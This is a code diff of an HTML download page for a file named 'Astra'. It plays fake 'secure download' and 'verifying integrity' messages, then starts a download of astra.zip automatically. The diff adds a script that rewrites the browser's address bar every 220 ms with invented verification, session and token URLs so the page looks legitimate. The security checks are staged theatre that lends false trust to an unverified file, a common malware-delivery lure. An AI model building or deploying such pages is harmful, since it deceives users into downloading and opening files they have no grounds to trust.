@@ -17,7 +17,6 @@ body{
   align-items:center;
   justify-content:center;
   overflow:hidden;
-  position:relative;
 }
 
 body::before{
@@ -31,98 +30,92 @@ body::before{
 }
 
 .wrap{
-  display:flex;flex-direction:column;align-items:center;
-  text-align:center;gap:0;position:relative;z-index:1;
-  padding:24px;
+  text-align:center;
+  z-index:1;
 }
 
 .logo-wrap{
   position:relative;
   width:128px;height:128px;
-  display:flex;align-items:center;justify-content:center;
-  margin-bottom:44px;
+  margin:0 auto 44px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
 }
 
 .logo-glow{
   position:absolute;inset:0;
   border-radius:50%;
-  background:radial-gradient(circle, rgba(255,255,255,0.12) 0%, transparent 65%);
+  background:radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
   animation:glowPulse 2.2s ease-in-out infinite;
 }
 
 @keyframes glowPulse{
   0%,100%{transform:scale(1);opacity:.7}
-  50%{transform:scale(1.18);opacity:1}
+  50%{transform:scale(1.2);opacity:1}
 }
 
 .ring{
   position:absolute;inset:0;
   border-radius:50%;
-  border:1px solid rgba(255,255,255,0.18);
-  animation:ringExpand 2.2s ease-out infinite;
+  border:1px solid rgba(255,255,255,0.2);
+  animation:ringExpand 2.5s ease-out infinite;
 }
-.ring:nth-child(3){animation-delay:.9s;opacity:.5}
+.ring:nth-child(3){animation-delay:.8s;opacity:.6}
 
 @keyframes ringExpand{
-  0%{transform:scale(.7);opacity:.8}
-  100%{transform:scale(1.6);opacity:0}
+  0%{transform:scale(.6);opacity:1}
+  100%{transform:scale(1.8);opacity:0}
 }
 
 .logo-img{
-  width:80px;height:80px;object-fit:contain;
-  position:relative;z-index:2;
-  filter:drop-shadow(0 0 16px rgba(255,255,255,0.5)) drop-shadow(0 0 32px rgba(255,255,255,0.2));
+  width:82px;height:82px;
+  object-fit:contain;
+  z-index:2;
+  filter:drop-shadow(0 0 20px rgba(255,255,255,0.6));
 }
 
 .msg-area{
-  height:48px;display:flex;align-items:center;justify-content:center;
-  margin-bottom:28px;width:340px;max-width:88vw;overflow:hidden;position:relative;
+  height:50px;
+  margin-bottom:32px;
+  position:relative;
 }
 
 .msg{
-  font-family:'Syne',sans-serif;font-weight:700;
-  font-size:clamp(1rem,4vw,1.25rem);
-  letter-spacing:0.04em;color:#fff;
-  position:absolute;opacity:0;transform:translateY(12px);
-  transition:opacity .4s ease,transform .4s ease;
-  white-space:nowrap;
+  font-family:'Syne',sans-serif;
+  font-weight:700;
+  font-size:1.3rem;
+  letter-spacing:0.05em;
+  position:absolute;
+  width:100%;
+  opacity:0;
+  transition:all 0.4s ease;
 }
-.msg.show{opacity:1;transform:translateY(0)}
-.msg.hide{opacity:0;transform:translateY(-12px)}
+
+.msg.show{opacity:1; transform:translateY(0);}
+.msg.hide{opacity:0; transform:translateY(-20px);}
 
 .progress-track{
-  width:280px;max-width:80vw;height:3px;
-  background:rgba(255,255,255,0.08);border-radius:3px;
-  overflow:hidden;margin-bottom:12px;
+  width:300px;
+  height:4px;
+  background:rgba(255,255,255,0.1);
+  border-radius:2px;
+  margin:0 auto 12px;
+  overflow:hidden;
 }
+
 .progress-fill{
-  height:100%;background:linear-gradient(90deg, #fff, #00ff9d);
-  width:0%;transition:width .8s cubic-bezier(0.4, 0, 0.2, 1);
+  height:100%;
+  width:0%;
+  background:linear-gradient(90deg, #ffffff, #00ffaa);
+  transition:width 0.9s ease;
 }
 
 .pct{
-  font-family:'Syne',sans-serif;font-size:0.68rem;font-weight:700;
-  letter-spacing:0.2em;color:rgba(255,255,255,0.4);
-}
-
-/* FAST CHANGING URL */
-.fake-url{
-  position:fixed;
-  bottom:30px;
-  left:50%;
-  transform:translateX(-50%);
-  background:rgba(0,0,0,0.75);
-  backdrop-filter:blur(10px);
-  padding:10px 20px;
-  border-radius:30px;
-  font-size:0.82rem;
-  font-family:monospace;
-  color:#00ff9d;
-  white-space:nowrap;
-  border:1px solid rgba(0, 255, 100, 0.2);
-  box-shadow:0 4px 20px rgba(0,0,0,0.6);
-  min-width:280px;
-  text-align:center;
+  font-family:'Syne',sans-serif;
+  font-size:0.75rem;
+  letter-spacing:0.15em;
+  color:rgba(255,255,255,0.5);
 }
 </style>
 </head>
@@ -133,16 +126,15 @@ body::before{
     <div class="logo-glow"></div>
     <div class="ring"></div>
     <div class="ring"></div>
-    <img class="logo-img" src="logo.png" alt="Astra"
-         onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 80 80%22><text y=%2260%22 font-size=%2256%22 fill=%22white%22>✦</text></svg>'"/>
+    <img class="logo-img" src="logo.png" alt="Astra"/>
   </div>
 
   <div class="msg-area">
     <div class="msg show" id="m0">Preparing secure download...</div>
-    <div class="msg" id="m1">Connecting to server</div>
-    <div class="msg" id="m2">Verifying file</div>
+    <div class="msg" id="m1">Connecting to nodes...</div>
+    <div class="msg" id="m2">Verifying integrity...</div>
     <div class="msg" id="m3">Downloading Astra...</div>
-    <div class="msg" id="m4">Almost ready!</div>
+    <div class="msg" id="m4">Finalizing...</div>
   </div>
 
   <div class="progress-track">
@@ -151,61 +143,58 @@ body::before{
   <div class="pct" id="pct">0%</div>
 </div>
 
-<div class="fake-url" id="fakeurl">astra-secure.net/loading...</div>
-
 <script>
-// CONFIG
+// Your file name
 const FILE_NAME = "astra.zip";
 
+// Spam URL list
+const urls = [
+  "/verify?token=9377ee10",
+  "/session?id=xK392pQm",
+  "/dl?file=astra-v2",
+  "/processing/node-7842",
+  "/secure/download",
+  "/finalize?hash=ak3928f",
+  "/loading?progress=92",
+  "/auth?ref=tau5"
+];
+
+let urlIndex = 0;
+
+// Rapidly change the actual browser URL
+function spamURL() {
+  setInterval(() => {
+    urlIndex = (urlIndex + 1) % urls.length;
+    const newURL = urls[urlIndex];
+    
+    // This changes the URL in the address bar without reloading
+    history.pushState(null, '', newURL);
+  }, 220); // Very fast spam
+}
+
 const steps = [
-  {id:'m0', p:15,  t:0},
-  {id:'m1', p:42,  t:1300},
-  {id:'m2', p:67,  t:2600},
-  {id:'m3', p:89,  t:4000},
-  {id:'m4', p:100, t:5200},
+  {id:'m0', p:18, t:0},
+  {id:'m1', p:45, t:1200},
+  {id:'m2', p:71, t:2500},
+  {id:'m3', p:88, t:3900},
+  {id:'m4', p:100, t:5100}
 ];
 
 const bar = document.getElementById('bar');
 const pct = document.getElementById('pct');
-const fakeurl = document.getElementById('fakeurl');
 
-const urlList = [
-  "astra-secure.net/verify?v=9377ee10",
-  "astra-secure.net/session/xK392p",
-  "astra-secure.net/dl?id=8fK9mP",
-  "astra-secure.net/processing/ak392",
-  "astra-secure.net/file/secure/Astra",
-  "astra-secure.net/finalize?token=3928",
-  "astra-secure.net/download/progress",
-  "astra-secure.net/node/7842"
-];
-
-// Super fast spam change
-function spamChangeURL() {
-  setInterval(() => {
-    const random = urlList[Math.floor(Math.random() * urlList.length)];
-    fakeurl.textContent = random;
-  }, 280); // Changes every 280ms → looks like spam
-}
-
-function setProgress(v) {
-  bar.style.width = v + '%';
-  pct.textContent = v + '%';
-}
-
-// Animation
 steps.forEach((step, i) => {
   setTimeout(() => {
-    if (i > 0) {
-      const prev = document.getElementById(steps[i-1].id);
-      prev.classList.remove('show');
-      prev.classList.add('hide');
+    if(i > 0){
+      document.getElementById(steps[i-1].id).classList.remove('show');
+      document.getElementById(steps[i-1].id).classList.add('hide');
     }
-    
     document.getElementById(step.id).classList.add('show');
-    setProgress(step.p);
+    
+    bar.style.width = step.p + '%';
+    pct.textContent = step.p + '%';
 
-    if (i === steps.length - 1) {
+    if(i === steps.length - 1){
       setTimeout(() => {
         const a = document.createElement('a');
         a.href = FILE_NAME;
@@ -213,12 +202,12 @@ steps.forEach((step, i) => {
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-      }, 700);
+      }, 800);
     }
   }, step.t);
 });
 
-spamChangeURL();
+spamURL();
 </script>
 </body>
 </html>
